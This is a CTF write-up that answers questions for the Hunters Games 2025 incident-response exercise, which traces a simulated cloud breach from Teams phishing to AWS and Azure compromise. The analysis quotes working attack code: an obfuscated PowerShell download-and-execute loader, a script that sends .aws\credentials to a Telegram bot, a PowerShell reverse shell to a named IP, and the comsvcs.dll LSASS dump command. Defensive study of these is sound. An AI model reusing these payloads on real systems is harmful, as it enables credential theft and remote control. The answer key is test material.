---
title: "The Hunters Games 2025 - CTF Write Up"
authors: [asalucci]
tags: [HackTheBox, CTF, trustinveritas, alessandro]
published: 2025-08-05
categories: ["SOC", "Analyst", "Write", "Up", "HackTheBox"]
---

# The Hunters Games 2025 - CTF Write Up

## 📋 Task 0 - Get Started

What began as a seemingly ordinary day at Dunder Mifflin took a sharp turn when IT noticed a spike in suspicious behavior across the company’s cloud infrastructure. Within hours, unexpected activity began surfacing in critical services, and by the time IT escalated the issue, some of the company’s production environment had already been wiped.

That’s when corporate called you in.

You are part of the elite Incident Response Team, tasked with investigating this sophisticated cyber attack spanning multiple cloud services. Your toolkit is the Hunters platform and access to logs stored in Snowflake. Your mission is to trace the attacker’s footsteps, uncover the scope of the breach, and determine exactly how deep the compromise goes, before more damage is done.

Let's start easy.

**How many leads were created in Hunters over the past 60 days?**  
> **`1209`**

---

## 📋 Task 1 - Attack Story

As you delve into the logs and trace the steps of the attacker, A user reported receiving a suspicious message on Teams,

**What is the overall score of the attack story correlating activity with Microsoft Teams?**  
> **`357`**

:::tip
Navigate to the Stories page under Threat Hunting section in Hunters and switch to Bookmark to see all the bookmarked stories.
:::

---

## 📋 Task 2 - Suspicious Message

A user reported receiving a message that appeared to come from internal IT. Upon closer inspection, the sender's address raised some red flags.

**What was the Email address used by the attacker?**  
> **`HelpDesk@officeit.onmicrosoft.com`**

---

## 📋 Task 3 - Suspicious Message #2

Continuing your investigation into the attack in Hunters, you analyze the logs to determine the extent of the attacker's phishing activity.

**How many messages did the attacker send during the conversation?**  
> **`4`**

![Messages-sent-from-the-attacker](img/Messages-sent-from-the-attacker.png)

---

## 📋 Task 4 - Suspicious Message #3

**What URL did the attacker send that was used to initiate the compromise?**  
> **`hxxps[://]drive[.]google[.]com/file/d/1jPXKHYbiOOz7pvZXyR2xxrNuQx60Dny4/view?usp=sharing`**

**❄️ SnowFlake Query:**

```sql
SELECT
 event_time,
 operation,
 user_id,
 raw
FROM
  o365_audit_logs
WHERE
  user_id ILIKE '%helpdesk@officeit.onmicrosoft.com%'
ORDER BY
  event_time DESC;
```

![Malicious-URL-to-Compromise](img/Malicious-URL-to-Compromise.png)

---

## 📋 Task 5 - Compromised Host

An alert indicates of suspicious activities on an endpoint in Hunters was found. Your task is to identify critical details about the compromised host.

**What is the hostname of the initially compromised host?**  
> **`MICHAEL-SCOTT-P`**

---

## 📋 Task 6 - RMM Tool

The attacker manipulated the user into establishing a connection back to their infrastructure, giving them remote access to the machine.

**What is the domain name of the instance the attacker used to host the session?**  
> **`node484265.dwservice.net`**

![Attacker-Used-to-host-the-session](img/Attacker-Used-to-host-the-session.png)

---

## 📋 Task 7 - Malicious Payload

Upon further investigation, you discover that a malicious payload was executed by the attacker.

**What is the process UID of the process that initially executed the payload?**
> **`23362585139`**

![Process-Which-Initiated-the-payload](img/Process-Which-Initiated-the-payload.png)

![Powershell-Payload-GitHub](img/Powershell-Payload-GitHub.png)

---

## 📋 Task 8 - Payload Origin

As you investigate the payload, you uncover an obfuscated command, By reversing the obfuscation, you can trace the origin of the payload.

**What is the full URL from which the payload was downloaded?**
> **`hxxps[://]raw[.]githubusercontent[.]com/TheOfficeIT/Tools/refs/heads/main/auto_patch[.]ps1`**

```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -encodedcommand "LgAoACIAewAwAH0AewAxAH0AIgAgAC0AZgAgACIASQAiACwAIgBFAFgAIgApACAAKAAmACgAIgB7ADAAfQB7ADIAfQB7ADEAfQAiACAALQBmACAAIgBOAGUAdwAiACwAIgB0ACIALAAiAC0ATwBiAGoAZQBjACIAKQAgACgAIgB7ADEAfQB7ADAAfQB7ADMAfQB7ADIAfQAiACAALQBmACAAIgBDAGwAaQBlACIALAAiAE4AZQB0AC4AVwBlAGIAIgAsACIAdAAiACwAIgBuACIAKQApAC4AKAAiAHsAMQB9AHsAMwB9AHsAMAB9AHsAMgB9ACIALQBmACIAZABTAHQAIgAsACIARABvAHcAbgBsACIALAAiAHIAaQBuAGcAIgAsACIAbwBhACIAKQAuAEkAbgB2AG8AawBlACgAKAAiAHsAOAB9AHsAMQB9AHsAMQA1AH0AewA1AH0AewAxADMAfQB7ADAAfQB7ADEAOAB9AHsANgB9AHsANwB9AHsAMQA2AH0AewA5AH0AewAzAH0AewAxADQAfQB7ADQAfQB7ADIAfQB7ADEAMAB9AHsAMQAxAH0AewAxADcAfQB7ADEAMgB9ACIAIAAtAGYAIgBiACIALAAiAHQAdABwAHMAOgAvAC8AcgAiACwAIgBoAGUAYQBkAHMALwBtAGEAaQBuAC8AIgAsACIAZQBJACIALAAiAG8AbwBsAHMALwByAGUAZgBzAC8AIgAsACIAdwAuAGcAaQAiACwAIgBlAHIAYwBvAG4AdABlAG4AIgAsACIAdAAuAGMAbwBtAC8AIgAsACIAaAAiACwAIgBPAGYAZgBpAGMAIgAsACIAYQB1AHQAIgAsACIAbwBfAHAAIgAsACIAMQAiACwAIgB0AGgAdQAiACwAIgBUAC8AVAAiACwAIgBhACIALAAiAFQAaABlACIALAAiAGEAdABjAGgALgBwAHMAIgAsACIAdQBzACIAKQApAA=="
```

```powershell
.("{0}{1}" -f "I","EX") (&("{0}{2}{1}" -f "New","t","-Objec") ("{1}{0}{3}{2}" -f "Clie","Net.Web","t","n")).("{1}{3}{0}{2}"-f"dSt","Downl","ring","oa").Invoke(("{8}{1}{15}{5}{13}{0}{18}{6}{7}{16}{9}{3}{14}{4}{2}{10}{11}{17}{12}" -f"b","ttps://r","heads/main/","eI","ools/refs/","w.gi","erconten","t.com/","h","Offic","aut","o_p","1","thu","T/T","a","The","atch.ps","us"))
```

:::tip

The full script is just using a bunch of `"string" -f ...` format calls to hide its true functionality.

:::

### 🔓 Deobfuscate the Hardcoded Strings

```powershell
("{0}{1}" -f "I", "EX")
→ IEX
```

```powershell
(&("{0}{2}{1}" -f "New", "t", "-Objec"))
→ New-Object
```

```powershell
("{1}{0}{3}{2}" -f "Clie", "Net.Web", "t", "n")
→ Net.WebClient
```

```powershell
("{1}{3}{0}{2}" -f "dSt", "Downl", "ring", "oa")
→ DownloadString
```

**💣 Final payload URL:**

```powershell
("{8}{1}{15}{5}{13}{0}{18}{6}{7}{16}{9}{3}{14}{4}{2}{10}{11}{17}{12}" -f
 "b", "ttps://r", "heads/main/", "eI", "ools/refs/", "w.gi", "erconten", "t.com/", "h",
 "Offic", "aut", "o_p", "1", "thu", "T/T", "a", "The", "atch.ps", "us")

→ hxxps[://]raw[.]githubusercontent[.]com/TheOfficeIT/Tools/refs/heads/main/auto_patch[.]ps1
```

![Decoded-Deobfuscated-Command](img/Decoded-Deobfuscated-Command.png)

### 🎭 PowerShell Script

```powershell
# Step-by-step deobfuscation
$part1 = "{0}{1}" -f "I", "EX"                        # → IEX
$part2 = "{0}{2}{1}" -f "New", "t", "-Objec"         # → New-Object
$part3 = "{1}{0}{3}{2}" -f "Clie", "Net.Web", "t", "n"  # → Net.WebClient
$part4 = "{1}{3}{0}{2}" -f "dSt", "Downl", "ring", "oa" # → DownloadString

# Final payload string
$url = "{8}{1}{15}{5}{13}{0}{18}{6}{7}{16}{9}{3}{14}{4}{2}{10}{11}{17}{12}" -f `
    "b", "ttps://r", "heads/main/", "eI", "ools/refs/", "w.gi", "erconten", "t.com/", `
    "h", "Offic", "aut", "o_p", "1", "thu", "T/T", "a", "The", "atch.ps", "us"

# Assemble final command
$finalCommand = "$part1 (`$($part2 $part3).$part4('$url'))"

Write-Host "`n✅ Reconstructed (but not executed) command:`n$finalCommand`n"
```

---

## 📋 Task 9 - Payload Analysis

Your analysis of the obfuscated payload reveals it pulls a second malicious payload from an external source. Upon execution, the payload begins interacting with local resources.

**What is the name of the file that the payload attempts to read?**
> **`.aws\credentials`**

### 🚨 `auto_patch.ps1`

The powershell payload which gets downloaded from GitHub.

```powershell
$wzy = "59";$tt = "58";$hes = "38";$123 = "37";$x4 = "10";$ty = ":";$gg = "AA";$ls = "GV";$hf = "Sw";$whoami = "vG";$whoareu = "fI";$potat = "RF";$xaxa = "YH";$yel = "Mq";$ydidu = "E0";$lol = "5x";$brb = "lC";$afk = "NI";$xor = "xz";$2s = "C-";$sha420 = "5O";$base58 = "Rp";$pythagoras = "Bo";$charles = "I"

$temp = $wzy + $tt + $hes + $123 + $x4 + $ty + $gg + $ls + $hf + $whoami + $whoareu + $potat + $xaxa + $yel + $ydidu + $lol + $brb + $afk + $xor + $2s + $sha420 + $base58 + $pythagoras + $charles

$__ox = "604"
$__cx = "972"
$__fx = "174"
$nsa842jf2 = $__cx + $__fx + $__ox

$__path_frag = ".aws\credentials"
$w26zxa842 = Get-Content (Join-Path $env:USERPROFILE $__path_frag) -Raw

$__tapi = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="))

$24t8veb = $__tapi + $temp + "/sendMessage"

Invoke-RestMethod -Uri $24t8veb -Method Post -Body @{ chat_id = $nsa842jf2; text = $w26zxa842 }
```

### 🐍 Python Deobuscation Script

**`deobufscate_auto_patch.py`**

```python
import re
import base64

code = r"""$wzy = "59";$tt = "58";$hes = "38";$123 = "37";$x4 = "10";$ty = ":";$gg = "AA";$ls = "GV";$hf = "Sw";$whoami = "vG";$whoareu = "fI";$potat = "RF";$xaxa = "YH";$yel = "Mq";$ydidu = "E0";$lol = "5x";$brb = "lC";$afk = "NI";$xor = "xz";$2s = "C-";$sha420 = "5O";$base58 = "Rp";$pythagoras = "Bo";$charles = "I"

$temp = $wzy + $tt + $hes + $123 + $x4 + $ty + $gg + $ls + $hf + $whoami + $whoareu + $potat + $xaxa + $yel + $ydidu + $lol + $brb + $afk + $xor + $2s + $sha420 + $base58 + $pythagoras + $charles

$__ox = "604"
$__cx = "972"
$__fx = "174"
$nsa842jf2 = $__cx + $__fx + $__ox

$__path_frag = ".aws\credentials"
$w26zxa842 = Get-Content (Join-Path $env:USERPROFILE $__path_frag) -Raw

$__tapi = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="))

$24t8veb = $__tapi + $temp + "/sendMessage"

Invoke-RestMethod -Uri $24t8veb -Method Post -Body @{ chat_id = $nsa842jf2; text = $w26zxa842 }"""

# Extract all variable assignments
vars = dict(re.findall(r'\$(\w+)\s*=\s*"([^"]+)"', code))

# Extract temp construction line
temp_line = re.search(r'\$temp\s*=\s*(.+)', code).group(1)
temp_vars = re.findall(r'\$(\w+)', temp_line)

# Resolve final token
token = ''.join(vars[v] for v in temp_vars)

# Extract chat_id
chat_id = ''.join([vars['__cx'], vars['__fx'], vars['__ox']])

# Extract base64 API
b64_api = re.search(r'FromBase64String\("([^"]+)"\)', code).group(1)
api = base64.b64decode(b64_api).decode()

# Build final URL
final_url = f"{api}{token}/sendMessage"

# Print all
print("✅ Telegram Bot Token:", token)
print("✅ Chat ID:", chat_id)
print("✅ Final Exfil URL:", final_url)
```

### 📌 Result

```powershell
✅ Telegram Bot Token: 5958383710:AAGVSwvGfIRFYHMqE05xlCNIxzC-5ORpBoI
✅ Chat ID: 972174604
✅ Final Exfil URL: hxxps[://]api[.]telegram[.]org/bot5958383710:AAGVSwvGfIRFYHMqE05xlCNIxzC-5ORpBoI/sendMessage
```

---

## 📋 Task 10 - Payload Analysis #2

**What is the full domain the payload sends its request to?**
> **`hxxps[://]api[.]telegram[.]org/bot5958383710:AAGVSwvGfIRFYHMqE05xlCNIxzC-5ORpBoI/sendMessage`**

---

## 📋 Task 10.5 - Payload Analysis #3

**What is the secret token used in the payload?**
> **`5958383710:AAGVSwvGfIRFYHMqE05xlCNIxzC-5ORpBoI`**

---

## 📋 Task 11 - Persistence Technique

To maintain access to the compromised device, the attacker established a method of persistence

**What process did the attacker use to implement persistence?**
> **`bitsadmin.exe`**

---

## 📋 Task 12 - Persistence Identification

**What is the name for the job that was created?**
> **`AdobeUpdaterTask`**

![BITS-For-Persistence](img/BITS-For-Persistence.png)

---

## 📋 Task 13 - Reverse Shell Origins

The investigation reveals a reverse shell was initiated during the attack.

**What is the attacker IP used for persistence?**
> **`20.7.173.122`**

![BITS-Persisten-Reverse-Shell](img/BITS-Persisten-Reverse-Shell.png)

![CyberChef-Decode-B64-Reverse-Shell](img/CyberChef-Decode-B64-Reverse-Shell.png)

```powershell
$client  =  New - Object System.Net.Sockets.TCPClient("20.7.173.122", 9001);
$stream  =  $client.GetStream();
[byte[]]$bytes  =  0..65535|% {
    0
}

;
while(($i  =  $stream.Read($bytes,  0,  $bytes.Length))  - ne 0) {
    ;
    $data  =  (New - Object  - TypeName System.Text.ASCIIEncoding).GetString($bytes, 0,  $i);
    $sendback  =  (iex $data 2 > &1 | Out - String );
    $sendback2  =  $sendback  +  "PS "  +  (pwd).Path  +  "> ";
    $sendbyte  =  ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush()
}

;
$client.Close()
```

---

## 📋 Task 14 - Privilege Escalation

In their attack, the attacker exploited a specific DLL on a remote machine.

**What is the DLL name abused by the attacker on the remote machine?**
> **`comsvcs.dll`**

---

## 📋 Task 15 - Privilege Escalation #2

During their privilege escalation phase, the attacker executed a known Windows DLL with a crafted argument: #+0000^24

**What function was invoked as a result of this execution?**
> **`MiniDumpW`**

![RunDLL32-Invoke-MiniDumpW-over-comsvcsDLL](img/RunDLL32-Invoke-MiniDumpW-over-comsvcsDLL.png)

### 🔍 Explanation

The command:

```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll #+000024 " 728 text.dmp full"
```

is using `rundll32.exe` to invoke a function within `comsvcs.dll` and specifically, the function associated with the **export ordinal #24** (`#+000024`).

- `rundll32.exe` can be used to execute exported functions in DLLs.
- `comsvcs.dll` (Component Services) exports many undocumented functions.
- **Ordinal #24** corresponds to a function in `comsvcs.dll` that wraps around `MiniDumpW`, an **internal helper function used for memory dumps**.

| Argument   | Meaning                    |
| ---------- | -------------------------- |
| `728`      | Target PID (often **LSASS**)   |
| `text.dmp` | Output dump filename       |
| `full`     | Type of dump (full memory) |

### 📌 Goal

This allows to dump memory of a process (in this case, PID `728`) to a file (`text.dmp`) without needing third-party tools like `procdump`.

- Used to dump the memory of **LSASS - Local Security Authority Subsystem Service** or other sensitive processes to extract credentials.
- Common technique in tools like **Mimikatz**, **Cobalt Strike**, or **manual post-exploitation**.
- **Bypasses AV detection** in many cases because `comsvcs.dll` is a signed, native Windows binary (aka [LOLBin](https://lolbas-project.github.io/) – Living Off the Land Binary).

:::info

**🔐 What Does LSASS Do?**  

| Function                     | Description                                                                              |
| ---------------------------- | ---------------------------------------------------------------------------------------- |
| ✅ **User Authentication**    | Verifies credentials during login (username + password).                                 |
| 🔑 **Credential Management** | Stores hashed or plaintext credentials (e.g., NTLM hashes, Kerberos tickets).            |
| 🔒 **Token Creation**        | Generates access tokens for authenticated users and processes.                           |
| 🔍 **Security Auditing**     | Logs security events (logins, privilege use, etc.) via Event ID 4624, etc.               |
| 🧠 **SSPI Interface**        | Exposes authentication APIs to applications via the Security Support Provider Interface. |

**🧨 Why Is LSASS Targeted by Attackers?**  

Because LSASS holds **credentials in memory**, attackers try to:

- **Dump LSASS memory** to extract:
  - NTLM password hashes
  - Cleartext passwords (in some configurations)
  - Kerberos tickets (TGTs, service tickets)

- Tools like:
  - `Mimikatz`
  - `ProcDump`
  - `rundll32 comsvcs.dll,#24`
  - `MiniDump` APIs

> ✅ **If LSASS is dumped, the system is compromised** and likely every user who's logged in.

:::

---

## 📋 Task 16 - Credentials Dump

As part of their tactics, the attacker dumped credentials to a specific file on the system.

**What is the file name of the file that contains the dumped credentials?**
> **`text.dmp`**

---

## 📋 Task 17 - Enumeration

After gaining access, the attacker began searching through the compromised machine for valuable information, Several files stood out as likely targets during this enumeration phase, all pointing toward credential harvesting.

**Name one of the files the attacker accessed during his enumeration.**
> **`chrome_creds.json`**

![Interesting-File-Access-On-MICHAEL-SCOTT-P](img/Interesting-File-Access-On-MICHAEL-SCOTT-P.png)

The attacker is **enumerating for stored credentials**, these shortcuts point to recently opened files.

- Password database files (`db_passwords`, `chrome_creds.json`)
- Config files (`pws.conf`, `motsdepasse`)

---

## 📋 Task 18 - Lateral Movement

As the investigation progressed, traces of suspicious activity extended beyond the on-prem environment and into the organization’s cloud infrastructure. Evidence suggests the attacker used previously stolen credentials to gain initial access to AWS.

**Which ARN was compromised and used by the attacker to access the AWS environment?**
> **`arn:aws:iam::588101796321:user/michael_scott`**

![Entity-Profile-Michael-Scott](img/Entity-Profile-Michael-Scott.png)

:::tip

**❓ What is an ARN?**  

An **ARN** is an **Amazon Resource Name**, which is a unique identifier used by AWS to refer to **resources**, **users**, **roles**, **policies**, and more across AWS services.

**🧬 ARN Format:**

```python
arn:partition:service:region:account-id:resource-type/resource-id
```

**🔍 Example (for an IAM Role):**  

```ruby
arn:aws:iam::123456789012:role/AdminAccess
```

:::

![Cloud-Recon-AWS-API](img/Cloud-Recon-AWS-API.png)

---

## 📋 Task 19 - AWS Compromise

**What is the ID of the AWS access key that was compromised?**
> **`AKIAYR3MZIHQ3RFG7LRY`**

![Lead-ARN-AWS-Michael-Scott-10-Distinct-Secrets](img/Lead-ARN-AWS-Michael-Scott-10-Distinct-Secrets.png)

![Lead-Activity-AWS-Secret-Compromise](img/Lead-Activity-AWS-Secret-Compromise.png)

---

## 📋 Task 20 - Initial Commands

Upon gaining access to AWS, the attacker issued a series of commands.

**What is the 2nd command executed by the attacker?**
> **`GetAccountSummary`**

![Commands-AWS-API](img/Commands-AWS-API.png)

---

## 📋 Task 21 - AWS Sign-in

With access to AWS API keys, the attacker’s next move was to transition into a console session, giving them interactive access to cloud resources. This requires calling a specific API to obtain temporary credentials suitable for login.

**Which AWS API call enabled the attacker to generate a token for console access?**
> **`sts:GetFederationToken`**

To enable attacker access to the AWS Management Console using previously stolen keys, they needed to transform static credentials into a login-capable session. In AWS **STS - Security Token Service**, this is achieved through dedicated API calls.

### ✅ Which AWS API call enabled console access?

`sts:GetFederationToken`

This **API** call produces a **set of temporary security credentials** (`AccessKeyId`, `SecretAccessKey`, `SessionToken`) specifically intended for federated users, which can be used with AWS Federation endpoints to create a console sign-in token—thereby allowing interactive console access.

*You can find more informations at the official [AWS - User Guide (Enable custom identity broker access to the AWS console)](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_enable-console-custom-url.html)*

---

## 📋 Task 22 - AWS Sign-in #2

Following the creation of a federation token, a access key was generated and used in the activity.

**What is the ID of the AWS access key that was used for the console login?**
> **`ASIAYR3MZIHQZN4LQCMP`**

![Informations-About-the-Attacker-AWS-Login](img/Informations-About-the-Attacker-AWS-Login.png)

---

## 📋 Task 23 - AWS Sign-in #3

The attacker left behind a small clue about the system they were using

**What is the operating system version used by the attacker?**
> **`10.15.7`**

---

## 📋 Task 24 - Persistence

In order to maintain access to the environment without drawing attention, the attacker made a specific AWS API call that granted them a persistent identity

**What AWS API call did the attacker use to establish persistence in the environment?**
> **`CreateUser`**

**❄️ SnowFlake Query:**  

```sql
SELECT
  event_name,
  event_time,
  user_identity_type,
  user_identity_user_name,
  source_ip_address,
  event_source,
  error_code,
  request_parameters
FROM
  aws_cloudtrail
WHERE
  event_name = 'CreateUser'
ORDER BY
  event_time DESC;
```

![CreateUser-AWS](img/CreateUser-AWS.png)

---

## 📋 Task 25 - Persistence #2

**What is the ID of the access key issued as part of this suspicious action?**
> **`AIDAYR3MZIHQ6ZIHWQAAR`**

**❄️ SnowFlake Query:**

```sql
SELECT *
FROM
  aws_cloudtrail
WHERE
  event_time BETWEEN '2025-07-25 19:09:20.000 +0000'
  AND '2025-07-25 20:09:20.000 +0000'
ORDER BY
  event_time ASC;
```

![SnowFlake-Query-Create-User](img/SnowFlake-Query-Create-User.png)

---

## 📋 Task 26 - Persistence #3

**Name one of the IAM policies attached to this access key?**
> **`AmazonEC2FullAccess`**

![AttachUserPolicy](img/AttachUserPolicy.png)

---

## 📋 Task 27 - Secret Exfiltration

As part of his attack, the attacker exfiltrated production secrets.

**What is the 2nd secret name accessed by the attacker?**
> **`dunder_production_2`**

**SnowFlake Query:**

```sql
SELECT *
FROM
  aws_cloudtrail
WHERE
  event_name ILIKE '%Secret%'
ORDER BY
  event_time ASC;
```

---

## 📋 Task 28 - Lateral Movement

After enumerating the AWS environment, the attacker decided to connect to an EC2 instance.

**What is the Instance ID of the instance the attacker accessed?**
> **`i-057b9e5dbbad18a06`**

**❄️ SnowFlake Query:**

```sql
SELECT
  DISTINCT CAST(
    GET_PATH (
      request_parameters,
      'instancesSet.items[0].instanceId'
    ) AS VARCHAR
  ) AS instance_id
FROM
  aws_cloudtrail
WHERE
  event_name ILIKE '%RunInstances%'
  OR event_name ILIKE '%StartInstances%'
  OR event_name ILIKE '%DescribeInstances%';
```

---

## 📋 Task 28.5 - Machine Identification

After enumerating the AWS environment, the attacker decided to connect to an EC2 instance.

**What is the EDR Agent ID of the instance?**
> **`61a702bec07c429b97a8d80f3eec7189`**

**❄️ SnowFlake Query:**

```sql
SELECT
  DEVICE_ID,
  HOSTNAME,
  OS_VERSION,
  EXTERNAL_IP,
  CID
FROM CROWDSTRIKE_DEVICES
WHERE os_version ILIKE '%Server%'
```

![EDR-Agent-ID](img/EDR-Agent-ID.png)

---

## 📋 Task 29 - Command Execution

After identifying the Instance that was used by the attacker. You continued with the investigation, trying to identify commands executed on the machine.

**Can you specify the EDR Target process ID of the process executed by the attacker?**
> **`65581976079`**

![EDR-Target-Process-ID](img/EDR-Target-Process-ID.png)

---

## 📋 Task 30 - Dead End

Your investigation into the deletion of production infrastructure in Azure has reached a dead end. The only remaining lead is a suspicious instance previously accessed by the attacker. While reviewing activity from that host, you uncover a set of requests targeting a different cloud resources.

**What is the third resource the attacker made a request to?**
> **`hxxps[://]graph[.]microsoft[.]com/`**

![Extract-URLs](img/Extract-URLs.png)

---

## 📋 Task 31 - Dead End #2

In reviewing activity from a compromised cloud-connected instance, you uncover a set of requests that target internal metadata endpoints.

**What technique was used by the attacker? Provide the full name of the first contributor listed under this technique in MITRE ATT&CK.**
> **`Alon Klayman`**

[T1078: Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)

---

## 📋 Task 32 - Dead End #3

Based on the name of the accessed resource, you understand that this machine has a special configuration enabling it to act as a bridge between environments.

**What is the feature name that is enabled on this instance that allows it?**
> **`Azure Arc Resource Bridge`**

- Manage and connect non-Azure environments, like on‑prem servers or edge devices, from within Azure
- Provide a centralized resource plane that enables hybrid, multi-cloud resource management
- Support workloads such as VMs and Kubernetes clusters running outside primary Azure subscriptions

### 🧾 Why It Fits

Since the instance was observed making metadata and resource API calls (like to `Graph`, `Key Vault`, etc.), this strongly suggests it is part of an **Arc‑managed infrastructure**, effectively acting as a '`bridge`' node between cloud and other environments.

---

## 📋 Task 33 - Azure Initial Access

Your investigation reveals a cloud identity was used to gain initial access to the Azure environment.

**What is the resource principal ID of the compromised identity?**
> **`f185b5ac-c369-42ab-808f-97e0b40cccfe`**

### 🪪 Identified Activities

**The compromised cloud identity had extensive and unauthorized access to critical Azure resources, notably:**

- Azure SQL Database
- Azure Storage
- Microsoft.HybridCompute Agent Service
- Azure Key Vault
- Azure Resource Manager
- Arc Token Service
- Microsoft Graph
- ArcGatewayApp
- GuestNotificationService

These resource accesses were notably associated with an identity consistently logged across multiple sensitive services, indicative of automated or malicious activity.

### 🧬 Analysis Methodology

- Aggregated logs from Azure sign-in events were analyzed.

- Suspicious access patterns were identified, focusing on unusual IP addresses and access to sensitive resources.

- Cross-referencing resource access timestamps, it was clear this identity repeatedly interacted with multiple critical resources within short intervals.

### 🕵️‍♂️ Implications

The breadth of access signifies that this compromised identity posed a high risk to the Azure environment, potentially enabling extensive lateral movement or data exfiltration activities.

---

## 📋 Task 33.5 - Azure Initial Access #2

You dig through Azure sign-in data to validate the suspicious activity. The events linked to this identity are stored in a distinct log category designed for a specific type of authentication flow.

**What is the log category name where the sign-in activity of this identity appears?**
> **`ManagedIdentitySignInLogs`**

**❄️ SnowFlake Query:**

```sql
SELECT
  DISTINCT category
FROM
  azure_signin
```

---

## 📋 Task 34 - Azure Initial Access #3

During your investigation, you come across a suspicious sign-in attributed to the Identity. However, something about the event seems off, there’s a critical piece of metadata missing.

**What is the IP Address used by the attacker to sign in to the resources?**
> **`52.136.29.3`**

---

## 📋 Task 35 - Attack on Azure

**What is the name of the second machine that was affected by the compromised identity?**
> **`printing-service-prod-2`**

- Parsed the `IDENTITY_AUTHORIZATION` field in `azure_signin` logs.
  - filtering specifically for events involving the compromised identity (`f185b5ac-c369-42ab-808f-97e0b40cccfe`)

- Extracted the virtual machine names embedded in the Azure resource scopes.
  - Two distinct VMs were identified: `printing-service-prod-1` and `printing-service-prod-2`

- `printing-service-prod-2` was listed second chronologically and is confirmed as the second affected machine.

---

## 📋 Task 36 - Attacker Identity

You’ve identified the attacker’s external payload source, attackers often leave behind artifacts. A closer look at where the malicious script is hosted may reveal more about who's behind it.

Can you uncover the attacker’s original email address?
> **`charlesminerr@gmail.com`**

![Git-Signature](img/Git-Signature.png)

---

## 🏆 Scoreboard

![MetaCTF-Scoreboard](img/MetaCTF-Scoreboard.png)

---

![EndOfHuntersCTF](img/EndOfHuntersCTF.png)